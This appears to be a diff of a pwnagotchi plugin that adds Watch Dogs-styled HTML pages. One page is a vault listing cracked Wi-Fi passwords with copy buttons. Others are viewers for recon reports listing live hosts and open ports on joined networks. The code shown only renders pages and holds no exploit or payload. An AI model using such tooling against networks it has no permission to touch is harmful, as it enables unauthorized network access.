+  font-size: 10px; letter-spacing: .25em; color: var(--mute);
+  text-transform: uppercase;
+}}
+.vault-meta dd {{ margin: 1px 0 0; color: var(--fg); word-break: break-all; }}
+.vault-meta code {{ color: var(--cyan); font-size: 12px; }}
+.vault-pw {{ border-left: 2px solid var(--green) !important; background: rgba(43,255,136,.05); }}
+.vault-pw dt {{ color: var(--green) !important; }}
+.vault-pw dd {{ display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }}
+.vault-pw .pw-val {{
+  color: var(--green) !important; font-size: 14px !important;
+  font-weight: 700; word-break: break-all; text-shadow: 0 0 6px rgba(43,255,136,.4);
+}}
+.vault-pw .copy {{
+  appearance: none; -webkit-appearance: none;
+  background: transparent; border: 1px solid var(--green); color: var(--green);
+  font: inherit; font-size: 10px; letter-spacing: .25em; text-transform: uppercase;
+  padding: 4px 8px; cursor: pointer;
+}}
+.vault-pw .copy.ok {{ background: var(--green); color: #002912; }}
+
+.empty {{ text-align: center; padding: 40px 12px; border: 1px dashed var(--grid); color: var(--mute); }}
+.empty-glyph {{ font-size: 42px; color: var(--green); opacity: .6; }}
+.empty p {{ margin: 8px 0 4px; letter-spacing: .25em; color: var(--fg); }}
+
+@media (min-width: 560px) {{
+  body {{ font-size: 15px; }}
+  .vault-meta {{ grid-template-columns: 1fr 2fr; }}
+}}
+
+footer.tag {{ margin: 16px 0 8px; text-align: center; color: var(--mute);
+  font-size: 10px; letter-spacing: .35em; }}
+</style>
+</head>
+<body>
+<div class='wrap'>
+  <div class='brand'>
+    <div class='mark'>&#x2713;</div>
+    <h1>ct<b>OS</b> // pwned vault</h1>
+    <span class='sub'>DedSec</span>
+  </div>
+
+  <nav class='nav'>
+    <a href='/plugins/wd_scanner/'>&larr; SCANNER</a>
+    <a href='/plugins/wd_scanner/pwned' class='active'>VAULT <span class='count'>{n}</span></a>
+  </nav>
+
+  <div class='section-h'>recovered keys</div>
+  {list_html}
+
+  <footer class='tag'>// the truth will set us free //</footer>
+</div>
+<script>
+(function () {{
+  document.addEventListener('click', function (ev) {{
+    var t = ev.target;
+    if (!t || !t.classList || !t.classList.contains('copy')) return;
+    var pw = t.getAttribute('data-pw') || '';
+    var done = function () {{
+      var orig = t.textContent;
+      t.classList.add('ok'); t.textContent = 'copied';
+      setTimeout(function () {{ t.classList.remove('ok'); t.textContent = orig; }}, 1200);
+    }};
+    if (navigator.clipboard && navigator.clipboard.writeText) {{
+      navigator.clipboard.writeText(pw).then(done, function () {{}});
+    }} else {{
+      var ta = document.createElement('textarea');
+      ta.value = pw; document.body.appendChild(ta); ta.select();
+      try {{ document.execCommand('copy'); done(); }} catch (e) {{}}
+      document.body.removeChild(ta);
+    }}
+  }});
+}})();
+</script>
+</body></html>
+""".format(n=n, list_html=list_html)
+        return body
+
+    # -------------------------------------------------------- recon viewer
+
+    def _render_recon_list(self):
+        reports = self._list_recon_reports()
+        running = self._recon_running
+        rows = []
+        for r in reports:
+            rep = self._load_recon_report(r["name"]) or {}
+            ssid = escape(rep.get("ssid") or "?")
+            bssid = escape(rep.get("bssid") or "?")
+            ip = escape(rep.get("ip") or "—")
+            subnet = escape(rep.get("subnet") or "—")
+            alive = len(rep.get("alive_hosts") or [])
+            with_ports = len(rep.get("ports") or {})
+            ts = time.strftime("%Y-%m-%d %H:%M", time.localtime(r["mtime"]))
+            rows.append(
+                "<a class='recon-row' href='/plugins/wd_scanner/recon/{name}'>"
+                "  <header class='recon-row-h'>"
+                "    <span class='recon-row-ssid'>{ssid}</span>"
+                "    <span class='recon-row-ts'>{ts}</span>"
+                "  </header>"
+                "  <dl class='recon-row-meta'>"
+                "    <div><dt>BSSID</dt><dd><code>{bssid}</code></dd></div>"
+                "    <div><dt>OUR IP</dt><dd>{ip}</dd></div>"
+                "    <div><dt>SUBNET</dt><dd>{subnet}</dd></div>"
+                "    <div><dt>ALIVE</dt><dd>{alive}</dd></div>"
+                "    <div><dt>W/ PORTS</dt><dd>{wp}</dd></div>"
+                "  </dl>"
+                "</a>".format(
+                    name=escape(r["name"]), ssid=ssid, bssid=bssid, ip=ip,
+                    subnet=subnet, alive=alive, wp=with_ports, ts=ts,
+                )
+            )
+        list_html = "\n".join(rows) if rows else (
+            "<div class='empty'>"
+            "<div class='empty-glyph'>&#x1f50d;</div>"
+            "<p>// NO RECON REPORTS</p>"
+            "<small>tap RECON on a PWNED card to start one</small>"
+            "</div>"
+        )
+
+        running_panel = ""
+        if running:
+            running_panel = (
+                "<div class='recon-panel'>"
+                "  <div class='recon-h'>"
+                "    <span class='recon-state run'>RUNNING</span>"
+                "    <span class='mute'>recon in progress&hellip;</span>"
+                "  </div>"
+                "  <pre class='log'>{lines}</pre>"
+                "</div>"
+            ).format(lines=escape("\n".join(self._recon_log[-100:])))
+
+        return self._chrome_page(
+            title="recon reports",
+            inner=(
+                "<nav class='nav'>"
+                "<a href='/plugins/wd_scanner/'>&larr; SCANNER</a>"
+                "<a href='/plugins/wd_scanner/pwned'>VAULT</a>"
+                "<a href='/plugins/wd_scanner/recon' class='active'>RECON "
+                "<span class='count cyan'>{n}</span></a>"
+                "</nav>"
+                "<div class='section-h'>recon reports</div>"
+                "{running}"
+                "{list_html}"
+            ).format(n=len(reports), running=running_panel, list_html=list_html),
+            mark_color="cyan",
+        )
+
+    def _render_recon_detail(self, name, rep):
+        ssid = escape(rep.get("ssid") or "?")
+        bssid = escape(rep.get("bssid") or "?")
+        ip = escape(rep.get("ip") or "—")
+        gw = escape(rep.get("gateway") or "—")
+        subnet = escape(rep.get("subnet") or "—")
+        dur = rep.get("duration_seconds") or 0
+
+        alive_hosts = rep.get("alive_hosts") or []
+        ports_map = rep.get("ports") or {}
+        names_map = rep.get("names") or {}
+
+        host_rows = []
+        for h in alive_hosts:
+            ports = ports_map.get(h) or []
+            ports_html = "<span class='mute'>—</span>" if not ports else (
+                " ".join(
+                    "<span class='port'>{p}/{pr}<i>{s}</i></span>".format(
+                        p=p["port"], pr=escape(p["proto"]),
+                        s=escape(p["service"]),
+                    ) for p in ports
+                )
+            )
+            host_rows.append(
+                "<article class='host-row'>"
+                "  <header class='host-h'>"
+                "    <code class='host-ip'>{ip}</code>"
+                "    <span class='host-name'>{nm}</span>"
+                "  </header>"
+                "  <div class='host-ports'>{ports}</div>"
+                "</article>".format(
+                    ip=escape(h),
+                    nm=escape(names_map.get(h) or ""),
+                    ports=ports_html,
+                )
+            )
+        hosts_html = "\n".join(host_rows) or (
+            "<div class='empty'>"
+            "<p>// no live hosts</p></div>"
+        )
+
+        log_lines = escape("\n".join((rep.get("log") or [])[-200:]))
+
+        inner = (
+            "<nav class='nav'>"
+            "<a href='/plugins/wd_scanner/recon'>&larr; REPORTS</a>"
+            "<a href='/plugins/wd_scanner/' class='active'>SCANNER</a>"
+            "</nav>"
+            "<div class='detail-card'>"
+            "  <h2>{ssid}</h2>"
+            "  <dl class='detail-meta'>"
+            "    <div><dt>BSSID</dt><dd><code>{bssid}</code></dd></div>"
+            "    <div><dt>OUR IP</dt><dd>{ip}</dd></div>"
+            "    <div><dt>GATEWAY</dt><dd>{gw}</dd></div>"
+            "    <div><dt>SUBNET</dt><dd>{subnet}</dd></div>"
+            "    <div><dt>DURATION</dt><dd>{dur}s</dd></div>"
+            "    <div><dt>ALIVE</dt><dd>{alive}</dd></div>"
+            "  </dl>"
+            "</div>"
+            "<div class='section-h'>hosts</div>"
+            "{hosts}"
+            "<div class='section-h'>log</div>"
+            "<pre class='log'>{log}</pre>"
+        ).format(
+            ssid=ssid, bssid=bssid, ip=ip, gw=gw, subnet=subnet, dur=dur,
+            alive=len(alive_hosts), hosts=hosts_html, log=log_lines,
+        )
+
+        return self._chrome_page(
+            title="recon // " + (rep.get("ssid") or "?"),
+            inner=inner,
+            mark_color="cyan",
+        )
+
+    def _chrome_page(self, title, inner, mark_color="cyan"):
+        """Shared dark Watch-Dogs chrome for the recon sub-pages."""
+        return """\
+<!doctype html>
+<html lang='en'>
+<head>
+<meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1, viewport-fit=cover'>
+<meta name='theme-color' content='#0a0d10'>
+<title>ctOS // {title}</title>
+<style>
+:root {{
+  --bg:#07090b; --panel:#111820; --grid:#1a232c;
+  --fg:#d8e4ec; --mute:#6c7c89;
+  --cyan:#00e5ff; --cyan-d:#00b8cc; --orange:#ff7a00; --green:#2bff88;
+}}
+* {{ box-sizing: border-box; }}
+html,body {{ margin: 0; padding: 0; }}
+body {{
+  background:
+    radial-gradient(1200px 600px at 50% -10%, rgba(0,229,255,.07), transparent 60%),
+    repeating-linear-gradient(0deg, rgba(255,255,255,.015) 0 1px, transparent 1px 3px),
+    var(--bg);
+  color: var(--fg);
+  font-family: ui-monospace, "JetBrains Mono", "Fira Code", Menlo, Consolas, monospace;
+  font-size: 14px; line-height: 1.4; min-height: 100vh;
+  padding: env(safe-area-inset-top) env(safe-area-inset-right)
+           env(safe-area-inset-bottom) env(safe-area-inset-left);
+}}
+body::before {{
+  content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 50;
+  background: repeating-linear-gradient(180deg, rgba(0,0,0,.18) 0 1px, transparent 1px 3px);
+  mix-blend-mode: multiply;
+}}
+.wrap {{ max-width: 720px; margin: 0 auto; padding: 12px; }}
+.brand {{
+  display: flex; align-items: center; gap: 10px;
+  padding: 10px 12px; margin-bottom: 10px;
+  border: 1px solid var(--grid);
+  background: linear-gradient(180deg, #0e141a, #0a0e12);
+  clip-path: polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%);
+}}
+.brand .mark {{
+  width: 28px; height: 28px; display: grid; place-items: center;
+  border: 1px solid var(--{mark}); color: var(--{mark});
+  font-weight: 700; text-shadow: 0 0 6px rgba(0,229,255,.6);
+}}
+.brand h1 {{ margin: 0; font-size: 14px; letter-spacing: .25em; text-transform: uppercase; color: var(--fg); }}
+.brand h1 b {{ color: var(--{mark}); }}
+.brand .sub {{ margin-left: auto; font-size: 11px; color: var(--mute); letter-spacing: .2em; }}
+
+.nav {{ display: flex; gap: 8px; margin: 0 0 12px; flex-wrap: wrap; }}
+.nav a {{
+  flex: 1; min-width: 110px;
+  display: inline-flex; align-items: center; justify-content: center;
+  height: 36px; padding: 0 10px;
+  font: inherit; font-weight: 700; letter-spacing: .2em; text-transform: uppercase;
+  background: transparent; color: var(--cyan);
+  border: 1px solid var(--grid); text-decoration: none;
+  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
+}}
+.nav a.active {{ border-color: var(--cyan); background: #06292e; }}
+.nav .count {{
+  display: inline-block; padding: 1px 6px; margin-left: 6px;
+  background: var(--green); color: #002912;
+  font-weight: 700; font-size: 10px; letter-spacing: .15em;
+}}
+.nav .count.cyan {{ background: var(--cyan); color: #002a30; }}
+
+.section-h {{
+  margin: 12px 0 8px; font-size: 11px; letter-spacing: .3em;
+  color: var(--mute); text-transform: uppercase;
+  display: flex; align-items: center; gap: 8px;
+}}
+.section-h::before, .section-h::after {{
+  content: ''; flex: 1; height: 1px; background: var(--grid);
+}}
+
+.recon-row {{
+  display: block; text-decoration: none; color: var(--fg);
+  background: linear-gradient(180deg, #0d1318, #0a0d11);
+  border: 1px solid var(--grid); padding: 10px 12px; margin-bottom: 8px;
+  position: relative;
+  clip-path: polygon(0 0, calc(100% - 12px) 0, 100% 12px, 100% 100%, 12px 100%, 0 calc(100% - 12px));
+}}
+.recon-row:hover {{ border-color: var(--cyan); }}
+.recon-row::before {{
+  content: ''; position: absolute; left: 0; top: 0; bottom: 0;
+  width: 3px; background: var(--cyan); box-shadow: 0 0 10px rgba(0,229,255,.4);
+}}
+.recon-row-h {{
+  display: flex; align-items: baseline; justify-content: space-between;
+  gap: 10px; margin-bottom: 6px;
+}}
+.recon-row-ssid {{ font-weight: 700; color: var(--cyan); font-size: 15px; }}
+.recon-row-ts {{ color: var(--mute); font-size: 11px; }}
+.recon-row-meta {{
+  display: grid; grid-template-columns: 1fr 1fr; gap: 4px 10px; margin: 0;
+}}
+.recon-row-meta dt {{ font-size: 10px; letter-spacing: .25em; color: var(--mute); }}
+.recon-row-meta dd {{ margin: 1px 0 0; }}
+.recon-row-meta code {{ color: var(--cyan); }}
+
+.detail-card {{
+  background: linear-gradient(180deg, #0d1318, #0a0d11);
+  border: 1px solid var(--cyan); padding: 12px;
+  margin-bottom: 8px;
+  clip-path: polygon(0 0, calc(100% - 12px) 0, 100% 12px, 100% 100%, 12px 100%, 0 calc(100% - 12px));
+}}
+.detail-card h2 {{ margin: 0 0 8px; color: var(--cyan); font-size: 16px; word-break: break-all; }}
+.detail-meta {{
+  display: grid; grid-template-columns: 1fr 1fr; gap: 6px 10px; margin: 0;
+}}
+.detail-meta dt {{ font-size: 10px; letter-spacing: .25em; color: var(--mute); }}
+.detail-meta dd {{ margin: 1px 0 0; }}
+.detail-meta code {{ color: var(--cyan); }}
+
+.host-row {{
+  background: #0a0e12; border: 1px solid var(--grid);
+  padding: 8px 10px; margin-bottom: 6px;
+  clip-path: polygon(0 0, calc(100% - 8px) 0, 100% 8px, 100% 100%, 8px 100%, 0 calc(100% - 8px));
+}}
+.host-h {{ display: flex; gap: 10px; align-items: baseline; margin-bottom: 4px; flex-wrap: wrap; }}
+.host-ip {{ color: var(--cyan); font-size: 14px; font-weight: 700; }}
+.host-name {{ color: var(--mute); font-size: 12px; word-break: break-all; }}
+.host-ports {{ display: flex; flex-wrap: wrap; gap: 4px; }}
+.port {{
+  background: #06292e; color: var(--cyan); border: 1px solid var(--cyan-d);
+  padding: 2px 6px; font-size: 11px; letter-spacing: .08em;
+}}
+.port i {{ font-style: normal; color: var(--mute); margin-left: 6px; }}
+
+.log {{
+  margin: 0;
+  background: #04070a; color: #b5e6ee;
+  border: 1px solid var(--grid);
+  padding: 10px 12px; font-size: 12px; line-height: 1.5;
+  max-height: 320px; overflow: auto;
+  white-space: pre-wrap; word-break: break-all;
+}}
+.empty {{ text-align: center; padding: 30px 12px; border: 1px dashed var(--grid); color: var(--mute); }}
+.empty-glyph {{ font-size: 38px; color: var(--cyan); opacity: .6; }}
+.empty p {{ margin: 8px 0 4px; letter-spacing: .25em; color: var(--fg); }}
+.recon-panel {{
+  border: 1px solid var(--cyan-d);
+  background: linear-gradient(180deg, #04161a, #07090b);
+  padding: 10px 12px; margin-bottom: 12px;
+  clip-path: polygon(0 0, calc(100% - 10px) 0, 100% 10px, 100% 100%, 10px 100%, 0 calc(100% - 10px));
+}}
+.recon-h {{
+  display: flex; align-items: center; justify-content: space-between;
+  gap: 10px; margin-bottom: 8px;
+}}
+.recon-state {{
+  font-size: 11px; letter-spacing: .25em; padding: 2px 8px;
+  border: 1px solid var(--grid);
+}}
+.recon-state.run {{
+  color: var(--green); border-color: var(--green);
+  text-shadow: 0 0 6px rgba(43,255,136,.5);
+}}
+.recon-state.idle {{ color: var(--mute); }}
+.mute {{ color: var(--mute); font-size: 11px; letter-spacing: .15em; }}
+
+@media (min-width: 560px) {{
+  body {{ font-size: 15px; }}
+  .recon-row-meta, .detail-meta {{ grid-template-columns: repeat(4, 1fr); }}
+}}
+
+footer.tag {{ margin: 16px 0 8px; text-align: center; color: var(--mute); font-size: 10px; letter-spacing: .35em; }}
+</style>
+</head>
+<body>
+<div class='wrap'>
+  <div class='brand'>
+    <div class='mark'>&#x1f50d;</div>
+    <h1>ct<b>OS</b> // {title}</h1>
+    <span class='sub'>DedSec</span>
+  </div>
+  {inner}
+  <footer class='tag'>// the truth will set us free //</footer>
+</div>
+</body></html>
+""".format(title=escape(title), inner=inner, mark=mark_color)
 
 
 def pwnagotchi_config_main_iface():
